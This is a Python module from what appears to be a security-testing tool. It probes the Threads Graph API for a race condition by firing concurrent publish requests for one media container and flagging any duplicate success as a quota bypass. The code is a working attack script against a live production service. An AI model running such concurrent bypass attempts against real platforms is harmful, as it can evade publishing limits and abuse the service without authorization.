import asyncio
import aiohttp
import time
import requests
from ..config import Config
from ..classifier import classify_response, TestResult
from typing import Callable, List
from rich.console import Console
from ..endpoints import Endpoint
from ..request_utils import safe_make_request
from tqdm import tqdm

console = Console()

async def async_make_request(session: aiohttp.ClientSession, url: str, data: dict, method: str) -> dict:
    start = time.time()
    try:
        if method.upper() == "POST":
            async with session.post(url, data=data) as response:
                text = await response.text()
                dur = int((time.time() - start) * 1000)
                return {"status": response.status, "text": text, "dur": dur}
        else:
            async with session.get(url, params=data) as response:
                text = await response.text()
                dur = int((time.time() - start) * 1000)
                return {"status": response.status, "text": text, "dur": dur}
    except Exception as e:
        dur = int((time.time() - start) * 1000)
        return {"status": 0, "text": str(e), "dur": dur}

async def run_race_condition(config: Config, save_result_callback: Callable, race_count: int = 10):
    console.print("\n[bold red on yellow]Running Race Condition Tests (Publishing Quota)[/bold red on yellow]")
    
    limit_url = "https://graph.threads.net/v1.0/me/threads_publishing_limit"
    params = {"fields": "config,quota_usage", "access_token": config.THREADS_TOKEN_A}
    
    res = safe_make_request("GET", limit_url, config.THREADS_TOKEN_A, params=params)
    console.print(f"Limit before: {res['text']}")
        
    create_url = "https://graph.threads.net/v1.0/me/threads"
    create_body = {
        "media_type": "TEXT",
        "text": f"race_condition_test_{int(time.time())}",
        "access_token": config.THREADS_TOKEN_A
    }
    
    res_create = safe_make_request("POST", create_url, config.THREADS_TOKEN_A, body=create_body)
    import json
    try:
        data = json.loads(res_create["text"])
        creation_id = data.get("id")
    except:
        creation_id = None
        
    if not creation_id:
        console.print("[red]Failed to create media container. Aborting race test.[/red]")
        return
        
    console.print(f"Media container created: {creation_id}")
        
    publish_url = "https://graph.threads.net/v1.0/me/threads_publish"
    publish_body = {
        "creation_id": creation_id,
        "access_token": config.THREADS_TOKEN_A
    }
    
    console.print(f"Firing {race_count} simultaneous publish requests...")
    
    async with aiohttp.ClientSession() as session:
        tasks = [async_make_request(session, publish_url, publish_body, "POST") for _ in range(race_count)]
        results = await asyncio.gather(*tasks)
        
    success_count = sum(1 for r in results if r["status"] == 200 and "id" in r["text"])
    fail_count = len(results) - success_count
    
    console.print(f"Successful publishes: {success_count}")
    console.print(f"Failed publishes: {fail_count}")
    
    classification = "NULL_SIGNAL"
    confidence = "HIGH"
    
    if success_count > 1:
        classification = "CONFIRMED_FINDING"
        console.print("\n[bold red on yellow] 🔴 DUPLICATE PUBLISH SUCCESSFUL: Race condition confirmed! [/bold red on yellow]")
    else:
        console.print("\n[green]✅ Rate limiting working properly.[/green]")
        
    for r in results:
        tr = TestResult(
            endpoint_id="race_threads_publish",
            token_label="THREADS_FULL",
            http_status=r["status"],
            response_body=r["text"],
            duration_ms=r["dur"],
            classification=classification,
            confidence=confidence,
            finding_class="Publish Race Condition Bypass" if success_count > 1 else None
        )
        fake_endpoint = Endpoint(id="race_threads_publish", method="POST", url_template=publish_url, required_scope="threads_basic", fields="", description="", expected_auth="THREADS_USER", is_write=True)
        save_result_callback(tr, publish_url, "POST", "{}", False, True)

    res_after = safe_make_request("GET", limit_url, config.THREADS_TOKEN_A, params=params)
    console.print(f"Limit after: {res_after['text']}")
